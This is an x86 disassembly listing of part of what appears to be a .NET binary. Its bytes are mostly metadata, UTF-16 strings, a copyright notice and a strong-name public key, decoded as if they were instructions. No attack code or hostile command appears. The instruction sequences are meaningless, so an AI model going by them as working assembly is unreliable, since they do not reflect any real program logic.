1100822d:	add    BYTE PTR [edi+0x0],ch
11008230:	outs   dx,BYTE PTR ds:[esi]
11008231:	add    BYTE PTR [eax+eax*1+0x69],ah
11008235:	add    BYTE PTR [edx+0x0],dh
11008238:	add    BYTE PTR [ebx],dl
1100823a:	arpl   WORD PTR [eax],ax
1100823c:	outs   dx,DWORD PTR ds:[esi]
1100823d:	add    BYTE PTR [esi+0x0],ch
11008240:	data16 add BYTE PTR [ecx+0x0],ch
11008244:	add    BYTE PTR [si+0x0],ah
11008248:	imul   eax,DWORD PTR [eax],0x15000072
1100824e:	popa   
1100824f:	add    BYTE PTR [eax+0x0],dh
11008252:	jo     0x11008254
11008254:	add    BYTE PTR fs:[ecx+0x0],ah
11008258:	je     0x1100825a
1100825a:	popa   
1100825b:	add    BYTE PTR [eax+eax*1+0x69],ah
1100825f:	add    BYTE PTR [edx+0x0],dh
11008262:	add    BYTE PTR [edi],bl
11008264:	dec    ebp
11008265:	add    BYTE PTR [ebx+0x0],dl
11008268:	inc    edi
11008269:	add    BYTE PTR [edi+0x0],bl
1100826c:	inc    ebx
1100826d:	add    BYTE PTR [eax+eax*1+0x49],cl
11008271:	add    BYTE PTR [edi+0x0],bl
11008274:	dec    esp
11008275:	add    BYTE PTR [ecx+0x0],cl
11008278:	inc    ebx
11008279:	add    BYTE PTR [ebp+0x0],al
1100827c:	dec    esi
1100827d:	add    BYTE PTR [ebx+0x0],dl
11008280:	inc    ebp
11008281:	add    BYTE PTR [eax],al
11008283:	pop    es
11008284:	das    
11008285:	add    BYTE PTR [ebx+0x0],ah
11008288:	cmp    eax,0x2d070000
1100828d:	add    BYTE PTR [ebx+0x0],ah
11008290:	cmp    al,BYTE PTR [eax]
11008292:	add    DWORD PTR [edi],eax
11008294:	sub    eax,0x3d006300
11008299:	add    BYTE PTR [ecx],al
1100829b:	pop    es
1100829c:	das    
1100829d:	add    BYTE PTR [ebx+0x0],ah
110082a0:	cmp    al,BYTE PTR [eax]
110082a2:	add    BYTE PTR [edi],ah
110082a4:	inc    ebx
110082a5:	add    BYTE PTR [eax+eax*1+0x49],cl
110082a9:	add    BYTE PTR [edi+0x0],bl
110082ac:	dec    ecx
110082ad:	add    BYTE PTR [esi+0x0],cl
110082b0:	push   esi
110082b1:	add    BYTE PTR [ecx+0x0],al
110082b4:	dec    esp
110082b5:	add    BYTE PTR [ecx+0x0],cl
110082b8:	inc    esp
110082b9:	add    BYTE PTR [edi+0x0],bl
110082bc:	inc    ebx
110082bd:	add    BYTE PTR [ebp+0x0],dl
110082c0:	dec    esp
110082c1:	add    BYTE PTR [eax+eax*1+0x55],dl
110082c5:	add    BYTE PTR [edx+0x0],dl
110082c8:	inc    ebp
110082c9:	add    BYTE PTR [eax],al
110082cb:	add    eax,0x6e0065
110082d0:	add    BYTE PTR [ebx],al
110082d2:	or     DWORD PTR [eax],eax
110082d4:	add    BYTE PTR [ecx],ch
110082d6:	das    
110082d7:	add    BYTE PTR [ebx+0x0],ah
110082da:	outs   dx,DWORD PTR ds:[esi]
110082db:	add    BYTE PTR [ebp+0x0],ch
110082de:	ins    DWORD PTR es:[edi],dx
110082df:	add    BYTE PTR [ecx+0x0],ah
110082e2:	outs   dx,BYTE PTR ds:[esi]
110082e3:	add    BYTE PTR [eax+eax*1+0x6c],ah
110082e7:	add    BYTE PTR [ecx+0x0],ch
110082ea:	outs   dx,BYTE PTR ds:[esi]
110082eb:	add    BYTE PTR [ebp+0x0],ah
110082ee:	push   0x6c006500
110082f3:	add    BYTE PTR [eax+0x0],dh
110082f6:	add    BYTE PTR cs:[eax+0x0],bh
110082fa:	ins    DWORD PTR es:[edi],dx
110082fb:	add    BYTE PTR [eax+eax*1+0x0],ch
110082ff:	adc    edx,DWORD PTR [eax+0x0]
11008302:	popa   
11008303:	add    BYTE PTR [edx+0x0],dh
11008306:	popa   
11008307:	add    BYTE PTR [edi+0x0],ah
1100830a:	jb     0x1100830c
1100830c:	popa   
1100830d:	add    BYTE PTR [eax+0x0],dh
11008310:	push   0x44270000
11008315:	add    BYTE PTR [ecx+0x0],bl
11008318:	dec    esi
11008319:	add    BYTE PTR [ecx+0x0],al
1100831c:	dec    ebp
1100831d:	add    BYTE PTR [ecx+0x0],cl
11008320:	inc    ebx
11008321:	add    BYTE PTR [edi+0x0],bl
11008324:	push   eax
11008325:	add    BYTE PTR [ecx+0x0],al
11008328:	inc    ebx
11008329:	add    BYTE PTR [ebx+0x0],cl
1100832c:	inc    ecx
1100832d:	add    BYTE PTR [edi+0x0],al
11008330:	inc    ebp
11008331:	add    BYTE PTR [eax+eax*1+0x49],cl
11008335:	add    BYTE PTR [ebx+0x0],dl
11008338:	push   esp
11008339:	add    BYTE PTR [eax],al
1100833b:	and    eax,DWORD PTR [ebx+0x0]
1100833e:	dec    esp
1100833f:	add    BYTE PTR [ecx+0x0],cl
11008342:	pop    edi
11008343:	add    BYTE PTR [ebp+0x0],dl
11008346:	push   ebx
11008347:	add    BYTE PTR [ecx+0x0],al
1100834a:	inc    edi
1100834b:	add    BYTE PTR [ebp+0x0],al
1100834e:	pop    edi
1100834f:	add    BYTE PTR [ebx+0x0],dl
11008352:	push   ebp
11008353:	add    BYTE PTR [ebp+0x0],cl
11008356:	dec    ebp
11008357:	add    BYTE PTR [ecx+0x0],al
1100835a:	push   edx
1100835b:	add    BYTE PTR [ecx+0x0],bl
1100835e:	add    BYTE PTR [edi],ah
11008360:	test   al,0xe4
11008362:	stos   BYTE PTR es:[edi],al
11008363:	clc    
11008364:	lods   al,BYTE PTR ds:[esi]
11008365:	jmp    0xffb2:0xf2b0f0ae
1100836c:	mov    ah,0xfc
1100836e:	mov    dh,0xe8
11008370:	mov    eax,0xbcf5bafc
11008375:	cli    
11008376:	mov    esi,0xc28fc0f6
1100837b:	xchg   ah,al
1100837d:	call   0x82ca:0x87c88ec6
11008384:	int3   
11008385:	cdq    
11008386:	add    DWORD PTR ds:0xceaafaa8,ebp
1100838c:	lods   al,BYTE PTR ds:[esi]
1100838d:	fldcw  WORD PTR [esi-0x4d274f25]
11008393:	fnsave [edx+edx*8-0x2547684a]
1100839a:	mov    edx,0xbed1bcce
1100839f:	retf   
110083a0:	shl    BYTE PTR [edx+eax*8-0x395f3b4f],0xe7
110083a8:	enter  0xcabd,0xa4
110083ac:	int3   
110083ad:	in     eax,dx
110083ae:	into   
110083af:	mov    ah,0xd0
110083b1:	loope  0x11008385
110083b3:	scas   al,BYTE PTR es:[edi]
110083b4:	add    DWORD PTR [ecx-0x5c],ebx
110083b7:	mul    BYTE PTR [esi-0x55305738]
110083bd:	fild   QWORD PTR [edx+ebx*8-0x3c4f3152]
110083c4:	mov    dl,0xd6
110083c6:	mov    ah,0xe9
110083c8:	mov    dh,0xfa
110083ca:	mov    eax,0xbcd8bad0
110083cf:	iret   
110083d0:	mov    esi,0xc2b2c0d0
110083d5:	lods   al,BYTE PTR ds:[esi]
110083d6:	les    esp,FWORD PTR [ebx-0x6a374c3a]
110083dc:	retf   0xcc9d
110083df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110083e0:	into   
110083e1:	mov    esp,0xb2d2a4d0
110083e6:	aam    0xb9
110083e8:	(bad)  
110083e9:	test   al,bl
110083eb:	lods   eax,DWORD PTR ds:[esi]
110083ec:	fisubr DWORD PTR [esi-0x49214624]
110083f2:	loopne 0x11008382
110083f4:	loop   0x110083b5
110083f6:	in     al,0xd4
110083f8:	out    0xd6,al
110083fa:	call   0xfddc6ec6
110083ff:	mov    cl,0xee
11008401:	test   al,0xf0
11008403:	xchg   esp,eax
11008404:	repnz popf 
11008406:	hlt    
11008407:	nop
11008408:	test   BYTE PTR [ebp-0x68056708],0x1
1100840f:	adc    eax,0xeea6f0a4
11008414:	test   al,0xe5
11008416:	stos   BYTE PTR es:[edi],al
11008417:	retf   0xc3ac
1100841a:	scas   al,BYTE PTR es:[edi]
1100841b:	enter  0xc4b0,0xb2
1100841f:	shl    BYTE PTR [edx+edx*8+0x1d2b6],cl
11008426:	add    BYTE PTR [eax],al
11008428:	dec    eax
11008429:	fisubr DWORD PTR [ebx-0x26]
1100842c:	sub    DWORD PTR [ecx+edx*1+0x2dd3ad45],ecx
11008433:	add    edi,DWORD PTR [ecx-0x3]
11008436:	and    eax,0x200400b4
1100843b:	add    DWORD PTR [ecx],eax
1100843d:	add    al,BYTE PTR [eax+eiz*1]
11008440:	add    DWORD PTR [ecx],eax
11008442:	push   cs
11008443:	add    esp,DWORD PTR [eax]
11008445:	add    BYTE PTR [ecx],al
11008447:	push   es
11008448:	and    BYTE PTR [edx],al
1100844a:	add    DWORD PTR [esi],ecx
1100844c:	adc    DWORD PTR ds:0x1022007,esi
11008452:	adc    DWORD PTR ds:0x20043d11,edi
11008458:	add    DWORD PTR [ecx],eax
1100845a:	or     BYTE PTR [eax+eiz*1],al
1100845d:	add    BYTE PTR [edx],dl
1100845f:	gs add al,0x20
11008462:	add    DWORD PTR [edx],eax
11008464:	push   cs
11008465:	add    al,0x20
11008467:	add    BYTE PTR [edx],dl
11008469:	ins    DWORD PTR es:[edi],dx
1100846a:	add    eax,0x12010120
1100846f:	popa   
11008470:	add    al,0x20
11008472:	add    DWORD PTR [ebx],eax
11008474:	or     BYTE PTR [ebx],al
11008476:	and    BYTE PTR [eax],al
11008478:	or     BYTE PTR [eax+eax*1],al
1100847b:	add    BYTE PTR [edx],dl
1100847d:	jno    0x11008483
1100847f:	and    BYTE PTR [ecx],al
11008481:	push   cs
11008482:	push   cs
11008483:	push   es
11008484:	add    BYTE PTR [edx],al
11008486:	push   cs
11008487:	push   cs
11008488:	sbb    eax,0x120041c
1100848d:	sbb    al,0x1c
1100848f:	add    eax,0x1c010220
11008494:	sbb    al,0x4
11008496:	add    BYTE PTR [eax],al
11008498:	adc    bh,BYTE PTR [ebp+0x5]
1100849b:	and    BYTE PTR [ecx],al
1100849d:	push   cs
1100849e:	adc    bh,BYTE PTR [ebp+0x4]
110084a1:	add    BYTE PTR [ecx],al
110084a3:	push   cs
110084a4:	push   cs
110084a5:	push   es
110084a6:	and    BYTE PTR [ecx],al
110084a8:	adc    al,BYTE PTR [eax+0x20040e85]
110084ae:	add    DWORD PTR [esi],ecx
110084b0:	or     BYTE PTR [eax+eiz*1],al
110084b3:	add    DWORD PTR [eax],ecx
110084b5:	push   cs
110084b6:	add    eax,0x80e0220
110084bb:	or     BYTE PTR [edx],al
110084bd:	push   es
110084be:	add    eax,DWORD PTR [esi]
110084c0:	add    BYTE PTR [ebx],al
110084c2:	push   cs
110084c3:	sbb    al,0x1c
110084c5:	sbb    al,0x4
110084c7:	add    BYTE PTR [ecx],al
110084c9:	add    DWORD PTR [esi],ecx
110084cb:	push   es
110084cc:	and    BYTE PTR [ecx],al
110084ce:	sbb    eax,0x3031d0e
110084d3:	and    BYTE PTR [eax],al
110084d5:	push   cs
110084d6:	add    eax,0x80120020
110084db:	xchg   ecx,eax
110084dc:	add    eax,0xe010220
110084e1:	push   cs
110084e2:	pop    es
110084e3:	add    BYTE PTR [edx],al
110084e5:	adc    al,BYTE PTR [eax+0x30e0e95]
110084eb:	and    BYTE PTR [eax],al
110084ed:	add    al,BYTE PTR ds:0xe020200
110084f3:	push   cs
110084f4:	add    al,0x0
110084f6:	add    DWORD PTR [esi],ecx
110084f8:	sbb    al,0x4
110084fa:	and    BYTE PTR [eax],al
110084fc:	adc    bl,BYTE PTR [ebp+0x5]
110084ff:	and    BYTE PTR [ecx],al
11008501:	add    DWORD PTR [edx],edx
11008503:	pop    ebp
11008504:	push   es
11008505:	and    BYTE PTR [ecx],al
11008507:	add    DWORD PTR [edx],edx
11008509:	adc    BYTE PTR [ebp+0x8012004],0x1c
11008510:	add    eax,0x80120020
11008515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
11008516:	push   es
11008517:	and    BYTE PTR [ecx],al
11008519:	adc    al,BYTE PTR [eax+0x20040e99]
1100851f:	add    DWORD PTR [eax],ecx
11008521:	add    eax,DWORD PTR [eax+eax*1]
11008524:	add    BYTE PTR [edx],dl
11008526:	popa   
11008527:	add    al,0x20
11008529:	add    DWORD PTR [edx],eax
1100852b:	sbb    al,0x6
1100852d:	add    BYTE PTR [ecx],al
1100852f:	adc    al,BYTE PTR [eax+0x20030e95]
11008535:	add    BYTE PTR [eax*1-0x7fedffe0],bl
1100853c:	lods   eax,DWORD PTR ds:[esi]
1100853d:	push   es
1100853e:	and    BYTE PTR [ecx],al
11008540:	add    DWORD PTR [edx],edx
11008542:	sbb    BYTE PTR [ecx+0x1012006],0x11
11008549:	xor    BYTE PTR [ecx+0xe010005],0x1d
11008550:	sbb    al,0x3
11008552:	add    BYTE PTR [eax],al
11008554:	push   cs
11008555:	or     ah,BYTE PTR [eax]
11008557:	add    eax,DWORD PTR [ecx]
11008559:	push   cs
1100855a:	adc    DWORD PTR [eax-0x3e7fee43],eax
11008560:	or     ah,BYTE PTR [eax]
11008562:	add    edx,DWORD PTR [edx]
11008564:	adc    ah,BYTE PTR gs:[ebp+0x12]
11008568:	add    ch,0x2
1100856b:	add    al,0x0
1100856d:	add    DWORD PTR [esi],ecx
1100856f:	add    cl,BYTE PTR [eax]
11008571:	and    BYTE PTR [edx],al
11008573:	add    DWORD PTR [edx],edx
11008575:	adc    al,BYTE PTR gs:[eax+0x12004c5]
1100857c:	sbb    al,0x8
1100857e:	add    al,0x20
11008580:	add    BYTE PTR ds:0x1200503,bl
11008586:	add    DWORD PTR ds:0x1200503,ebx
1100858c:	add    DWORD PTR [edx],edx
1100858e:	ins    DWORD PTR es:[edi],dx
1100858f:	or     BYTE PTR [eax],ah
11008591:	add    BYTE PTR ds:0x1d98011,dl
11008597:	add    al,BYTE PTR ds:0x80120000
1100859d:	fld    QWORD PTR ds:0x12010120
110085a3:	jge    0x110085aa
110085a5:	add    BYTE PTR [edx],al
110085a7:	push   cs
110085a8:	push   cs
110085a9:	sbb    al,0x5
110085ab:	add    BYTE PTR [eax],al
110085ad:	adc    al,BYTE PTR [eax+0x4000791]
110085b3:	push   cs
110085b4:	push   cs
110085b5:	push   cs
110085b6:	push   cs
110085b7:	push   cs
110085b8:	pop    es
110085b9:	and    BYTE PTR [edx],al
110085bb:	add    DWORD PTR [esi],ecx
110085bd:	adc    DWORD PTR [ecx+0x1000801],eax
110085c3:	adc    al,BYTE PTR [eax-0x127fed0f]
110085c9:	add    eax,0x80120020
110085ce:	lds    eax,FWORD PTR [esi]
110085d0:	and    BYTE PTR [ecx],al
110085d2:	add    DWORD PTR [edx],edx
110085d4:	add    ch,0x6
110085d7:	and    BYTE PTR [ecx],al
110085d9:	add    DWORD PTR [edx],edx
110085db:	sub    cl,0x6
110085de:	and    BYTE PTR [ecx],al
110085e0:	add    DWORD PTR [edx],edx
110085e2:	or     DWORD PTR ds:0x1012006,0x6158112
110085ec:	and    BYTE PTR [ecx],al
110085ee:	adc    al,BYTE PTR [ecx+0x40e19]
110085f4:	add    DWORD PTR [edx],eax
110085f6:	push   cs
110085f7:	add    eax,0x81120020
110085fc:	and    eax,0x1012006
11008601:	adc    al,BYTE PTR [ecx+0xe060229]
11008607:	push   es
11008608:	and    BYTE PTR [ecx],al
1100860a:	adc    al,BYTE PTR [ecx+0x20060e21]
11008610:	add    DWORD PTR [ecx],eax
11008612:	adc    al,BYTE PTR [ecx+0x6001321]
11008618:	adc    DWORD PTR [ecx-0x2a7fedc7],eax
1100861e:	push   cs
1100861f:	push   cs
11008620:	adc    DWORD PTR [ecx+0x45811141],eax
11008626:	adc    DWORD PTR [ecx+0x2000539],eax
1100862c:	add    DWORD PTR [esi],ecx
1100862e:	sbb    al,0x6
11008630:	add    BYTE PTR [ecx],al
11008632:	add    DWORD PTR [edx],edx
11008634:	sub    DWORD PTR [ecx],0x12002004
1100863a:	jge    0x11008640
1100863c:	push   es
1100863d:	adc    al,BYTE PTR [ecx+0x1200669]
11008643:	adc    al,BYTE PTR [ecx+0x20040e69]
11008649:	add    DWORD PTR [esi+ecx*1],ebx
1100864c:	add    eax,0x7d120100
11008651:	or     BYTE PTR [eax],cl
11008653:	and    BYTE PTR [edx],al
11008655:	add    DWORD PTR [edx],edx
11008657:	xor    DWORD PTR ds:0x20086112,0x81120102
11008661:	xor    eax,0x20065d12
11008666:	add    DWORD PTR [eax],ecx
11008668:	adc    al,BYTE PTR [eax+0x12006d5]
1100866e:	add    DWORD PTR [ecx],edx
11008670:	add    DWORD PTR [ebp+0x5c7ab708],0xe0341956
1100867a:	mov    DWORD PTR [eax],ecx
1100867c:	or     dl,BYTE PTR [eax-0x20]
1100867f:	out    dx,eax
11008680:	dec    esp
11008681:	mov    al,ds:0x3108fe13
11008686:	mov    edi,0x36ad5638
1100868b:	dec    esi
1100868c:	xor    eax,0x1000108
11008691:	add    BYTE PTR [eax],al
11008693:	add    BYTE PTR [eax],al
11008695:	add    BYTE PTR ds:0x1,al
1100869b:	add    BYTE PTR [edx],al
1100869d:	push   es
1100869e:	or     BYTE PTR ds:0xe010220,al
110086a4:	or     BYTE PTR [ebx],al
110086a6:	push   es
110086a7:	adc    bl,BYTE PTR [ecx+0x2]
110086aa:	push   es
110086ab:	add    cl,BYTE PTR [edx]
110086ad:	add    BYTE PTR [ebx],al
110086af:	adc    bl,BYTE PTR [ecx+0x1d]
110086b2:	push   cs
110086b3:	adc    bl,BYTE PTR [ebp+0x12]
110086b6:	popa   
110086b7:	or     BYTE PTR [eax],al
110086b9:	add    eax,DWORD PTR [ecx]
110086bb:	push   cs
110086bc:	adc    BYTE PTR [esi],cl
110086be:	adc    BYTE PTR [esi],cl
110086c0:	pop    es
110086c1:	add    BYTE PTR [edx],al
110086c3:	adc    ah,BYTE PTR [ecx+0xe]
110086c6:	adc    ah,BYTE PTR [ecx+0x3]
110086c9:	add    BYTE PTR [eax],al
110086cb:	add    DWORD PTR ds:0x12010100,eax
110086d1:	pop    ecx
110086d2:	pop    es
110086d3:	add    BYTE PTR [edx],al
110086d5:	add    DWORD PTR [edx],edx
110086d7:	pop    ecx
110086d8:	adc    ah,BYTE PTR [ecx+0x6]
110086db:	add    BYTE PTR [ecx],al
110086dd:	add    DWORD PTR [edx],edx
110086df:	add    BYTE PTR [ebp+0x1020007],0x12
110086e6:	popa   
110086e7:	adc    ch,BYTE PTR [ebp+0x5]
110086ea:	add    BYTE PTR [edx],al
110086ec:	push   cs
110086ed:	push   cs
110086ee:	or     BYTE PTR ds:0x12010100,al
110086f4:	ins    DWORD PTR es:[edi],dx
110086f5:	add    eax,0x1d0e0100
110086fa:	push   cs
110086fb:	pop    es
110086fc:	add    BYTE PTR [ebx],al
110086fe:	add    DWORD PTR [edx],eax
11008700:	push   cs
11008701:	adc    ch,BYTE PTR [ebp+0x6]
11008704:	add    BYTE PTR [edx],al
11008706:	add    DWORD PTR [esi],ecx
11008708:	adc    ch,BYTE PTR [ebp+0x5]
1100870b:	add    BYTE PTR [ecx],al
1100870d:	push   cs
1100870e:	adc    ch,BYTE PTR [ebp+0x8]
11008711:	add    BYTE PTR [edx],al
11008713:	add    DWORD PTR [edx],edx
11008715:	xor    ch,0x12
11008718:	ins    DWORD PTR es:[edi],dx
11008719:	add    eax,0x1d080100
1100871e:	push   cs
1100871f:	add    al,0x1
11008721:	add    BYTE PTR [eax],al
11008723:	add    BYTE PTR ds:0x1d020100,al
11008729:	push   cs
1100872a:	or     al,0x20
1100872c:	add    al,0x8
1100872e:	adc    bl,BYTE PTR [ecx+0x12]
11008731:	xor    DWORD PTR ds:0x61125d12,0xe002803
1100873b:	add    ebp,DWORD PTR [eax]
1100873d:	add    BYTE PTR [eax],cl
1100873f:	and    BYTE PTR [eax+0x2400],0x4
11008746:	add    BYTE PTR [eax],0x0
11008749:	xchg   esp,eax
1100874a:	add    BYTE PTR [eax],al
1100874c:	add    BYTE PTR [esi],al
1100874e:	add    al,BYTE PTR [eax]
11008750:	add    BYTE PTR [eax],al
11008752:	and    al,0x0
11008754:	add    BYTE PTR [edx+0x53],dl
11008757:	inc    ecx
11008758:	xor    DWORD PTR [eax],eax
1100875a:	add    al,0x0
1100875c:	add    BYTE PTR [ecx],al
1100875e:	add    BYTE PTR [ecx],al
11008760:	add    BYTE PTR [edi-0x5b65fa57],dl
11008766:	push   ecx
11008767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
11008768:	push   edi
11008769:	adc    DWORD PTR [edi+0x4d],ebx
1100876c:	sbb    eax,0x45dbaf04
11008771:	fbstp  TBYTE PTR [eax+edi*1]
11008774:	es push edi
11008776:	cld    
11008777:	xor    dl,BYTE PTR [ebx+edx*8-0x17]
1100877b:	fbstp  TBYTE PTR [edi-0x2e]
1100877e:	in     al,dx
1100877f:	pushf  
11008780:	outs   dx,BYTE PTR ds:[esi]
11008781:	inc    ecx
11008782:	adc    DWORD PTR [ecx],esi
11008784:	inc    esp
11008785:	rol    BYTE PTR [edx-0x38],0xa2
11008789:	rcr    DWORD PTR [ebp-0x6e],0x85
1100878d:	mov    esp,DWORD PTR [esi-0x6]
11008790:	lahf   
11008791:	or     ah,cl
11008793:	adc    al,0xde
11008795:	iret   
11008796:	call   0x9f525264
1100879b:	jbe    0x1100881b
1100879d:	leave  
1100879e:	(bad)
110087a1:	or     DWORD PTR [edi],esi
110087a3:	fcom   st(1)
110087a5:	add    eax,0xde8263f
110087aa:	push   edi
110087ab:	mov    edi,0xfa98ae6b
110087b0:	dec    ecx
110087b1:	xor    al,0xd6
110087b3:	jge    0x11008816
110087b5:	in     al,0x45
110087b7:	scas   al,BYTE PTR es:[edi]
110087b8:	mov    WORD PTR [ecx+0x66b1018b],fs
110087be:	mov    ebp,0x45cf929c
110087c3:	fcmove st,st(5)
110087c5:	inc    ebx
110087c6:	or     eax,0xa58b9991
110087cb:	pusha  
110087cc:	inc    edi
110087cd:	adc    eax,0x2df0e00e
110087d2:	retf   0xb3fa
110087d5:	and    BYTE PTR [esi+0x59b94395],0x57
110087dc:	out    0xc1,al
110087de:	call   0x12483122
110087e3:	add    BYTE PTR [edx],bl
110087e5:	cs dec esi
110087e7:	inc    ebp
110087e8:	push   esp
110087e9:	inc    esi
110087ea:	jb     0x1100884d
110087ec:	ins    DWORD PTR es:[edi],dx
110087ed:	gs ja  0x1100885f
110087f0:	jb     0x1100885d
110087f2:	sub    al,0x56
110087f4:	gs jb  0x1100886a
110087f7:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
110087fe:	xor    BYTE PTR [ecx],al
11008800:	add    BYTE PTR [esi+ecx*1+0x14],dl
11008804:	inc    esi
11008805:	jb     0x11008868
11008807:	ins    DWORD PTR es:[edi],dx
11008808:	gs ja  0x1100887a
1100880b:	jb     0x11008878
1100880d:	inc    esp
1100880e:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
11008815:	popa   
11008816:	ins    DWORD PTR es:[edi],dx
11008817:	adc    BYTE PTR gs:[esi],ch
1100881a:	dec    esi
1100881b:	inc    ebp
1100881c:	push   esp
1100881d:	and    BYTE PTR [esi+0x72],al
11008820:	popa   
11008821:	ins    DWORD PTR es:[edi],dx
11008822:	gs ja  0x11008894
11008825:	jb     0x11008892
11008827:	and    BYTE PTR [eax+edx*1],dh
1100882a:	add    DWORD PTR [eax],eax
1100882c:	or     eax,DWORD PTR [edi+ebp*2+0x74]
11008830:	data16 jne 0x110088a6
11008833:	arpl   WORD PTR [ecx+0x74],sp
11008836:	outs   dx,DWORD PTR ds:[esi]
11008837:	jb     0x11008839
11008839:	add    BYTE PTR [esi],bl
1100883b:	add    DWORD PTR [eax],eax
1100883d:	sbb    DWORD PTR [eax+0x72],edx
11008840:	gs inc ebp
11008842:	ins    DWORD PTR es:[edi],dx
11008843:	jo     0x110088b9
11008845:	imul   esi,DWORD PTR [esi+0x65],0x6c6f5320
1100884c:	jne    0x110088c2
1100884e:	imul   ebp,DWORD PTR [edi+0x6e],0x4c202c73
11008855:	dec    esp
11008856:	inc    ebx
11008857:	add    BYTE PTR [eax],al
11008859:	sub    eax,0x43280001
1100885e:	outs   dx,DWORD PTR ds:[esi]
1100885f:	jo     0x110088da
11008861:	jb     0x110088cc
11008863:	addr16 push 0x30322074
11008869:	xor    BYTE PTR [edx],dh
1100886b:	sub    eax,0x32313032
11008870:	sub    al,0x20
11008872:	inc    ecx
11008873:	ins    BYTE PTR es:[edi],dx
11008874:	ins    BYTE PTR es:[edi],dx
11008875:	and    BYTE PTR [edx+0x69],dl
11008878:	addr16 push 0x52207374
1100887e:	gs jae 0x110088e6
11008881:	jb     0x110088f9
11008883:	gs add BYTE PTR fs:[eax],al
11008887:	sub    DWORD PTR [eax+0x1],0x44628100
1100888e:	outs   dx,DWORD PTR ds:[esi]
1100888f:	je     0x110088f7
11008891:	jne    0x11008906
11008893:	arpl   WORD PTR [ecx+0x74],sp
11008896:	outs   dx,DWORD PTR ds:[esi]
11008897:	jb     0x110088c7
11008899:	push   esp
1100889a:	gs jae 0x11008911
1100889d:	jae    0x110088cd
1100889f:	push   ebp
110088a0:	outs   dx,BYTE PTR ds:[esi]
110088a1:	imul   esi,DWORD PTR [esp+ebp*1+0x20],0x6c627550
110088a9:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
110088b0:	xor    BYTE PTR [edx],dh
110088b2:	xor    al,0x30
110088b4:	xor    BYTE PTR [eax],dh
110088b6:	xor    BYTE PTR [eax],dh
110088b8:	xor    al,0x38
110088ba:	xor    BYTE PTR [eax],dh
110088bc:	xor    BYTE PTR [eax],dh
110088be:	xor    BYTE PTR [ecx],bh
110088c0:	xor    al,0x30
110088c2:	xor    BYTE PTR [eax],dh
110088c4:	xor    BYTE PTR [eax],dh
110088c6:	xor    BYTE PTR [eax],dh
110088c8:	xor    BYTE PTR ss:[edx],dh
110088cb:	xor    BYTE PTR [eax],dh
110088cd:	xor    BYTE PTR [eax],dh
110088cf:	xor    BYTE PTR [eax],dh
110088d1:	xor    dh,BYTE PTR [eax+esi*1]
110088d4:	xor    BYTE PTR [eax],dh
110088d6:	xor    BYTE PTR ds:0x34333532,dh
110088dc:	xor    DWORD PTR [ebx],esi
110088de:	xor    DWORD PTR [eax],esi
110088e0:	xor    BYTE PTR [eax],dh
110088e2:	xor    al,0x30
110088e4:	xor    BYTE PTR [eax],dh
110088e6:	xor    BYTE PTR [eax],dh
110088e8:	xor    DWORD PTR [eax],esi
110088ea:	xor    BYTE PTR [eax],dh
110088ec:	xor    DWORD PTR [eax],esi
110088ee:	xor    BYTE PTR [ecx],bh
110088f0:	aaa    
110088f1:	popa   
110088f2:	cmp    DWORD PTR [eax],esi
110088f4:	xor    eax,0x34616139
110088f9:	xor    eax,0x35346131
110088fe:	aaa    
110088ff:	xor    DWORD PTR [ecx],esi
11008901:	xor    eax,0x31643466
11008906:	xor    BYTE PTR fs:[ecx+eiz*2],dh
1100890a:	bound  si,DWORD PTR fs:[esi*1+0x34336664]
11008913:	xor    edi,DWORD PTR [eax]
11008915:	xor    dh,BYTE PTR [esi]
11008917:	xor    eax,0x33636637
1100891c:	xor    dh,BYTE PTR ds:0x65336434
11008922:	cmp    DWORD PTR [esi+eiz*2+0x37],esp
11008926:	aaa    
11008927:	xor    ah,BYTE PTR fs:[ebp+0x63]
1100892b:	cmp    DWORD PTR [ebx+0x36],esp
1100892e:	gs xor al,0x31
11008931:	xor    DWORD PTR [ecx],esi
11008933:	xor    esi,DWORD PTR [ecx]
11008935:	xor    al,0x34
11008937:	arpl   WORD PTR [eax],si
11008939:	xor    al,0x32
1100893b:	arpl   WORD PTR [eax],di
1100893d:	popa   
1100893e:	xor    ah,BYTE PTR [ebx+0x31]
11008941:	xor    eax,0x38323964
11008946:	xor    eax,0x36366238
1100894b:	popaw  
1100894d:	cmp    DWORD PTR [esi+0x30],esp
11008950:	cmp    BYTE PTR [ebx+0x63],ah
11008953:	xor    DWORD PTR [esp+eiz*2],esi
11008956:	arpl   WORD PTR gs:[esi+0x65],sp
1100895a:	cmp    BYTE PTR [ebx+0x39],ah
1100895d:	arpl   WORD PTR [ecx+0x35],sp
11008960:	xor    DWORD PTR [eax],edi
11008962:	gs aaa 
11008964:	ss aaa 
11008966:	arpl   WORD PTR gs:[ecx],di
11008969:	arpl   WORD PTR ds:0x38626663,si
1100896f:	xor    BYTE PTR [ecx],bh
11008971:	xor    esi,DWORD PTR [edi]
11008973:	cmp    BYTE PTR fs:[ecx+esi*1+0x30],ah
11008978:	xor    eax,0x36326633
1100897d:	cmp    BYTE PTR gs:[eax],dh
11008980:	fs xor eax,0x36666237
11008986:	bound  esp,QWORD PTR [ecx+0x65]
11008989:	cmp    DWORD PTR [eax],edi
1100898b:	popaw  
1100898d:	xor    al,0x39
1100898f:	xor    esi,DWORD PTR [esp+eiz*2]
11008992:	ss aaa 
11008994:	fs xor DWORD PTR ss:[ebp+0x34],esp
11008999:	xor    al,0x35
1100899b:	popa   
1100899c:	cmp    BYTE PTR gs:[ebx+0x61],ah
110089a0:	xor    DWORD PTR [eax],edi
110089a2:	bound  esi,QWORD PTR [eax]
110089a4:	xor    DWORD PTR [edx+0x31],esp
110089a7:	ss bound esp,QWORD PTR ss:[ecx+edi*1+0x63]
110089ad:	cmp    DWORD PTR [edx],esi
110089af:	arpl   WORD PTR [esi+0x34],sp
110089b2:	xor    eax,0x64636164
110089b7:	xor    al,0x33
110089b9:	xor    BYTE PTR [ecx+edi*1+0x31],ah
110089bd:	cmp    DWORD PTR [ecx],edi
110089bf:	cmp    BYTE PTR [edx+0x61],ah
110089c2:	xor    eax,0x37343036
110089c7:	xor    DWORD PTR ds:0x30656530,esi
110089cd:	data16 xor BYTE PTR [edx],dh
110089d0:	arpl   WORD PTR fs:[ecx+0x66],sp
110089d4:	popa   
110089d5:	bound  esi,QWORD PTR [ebx]
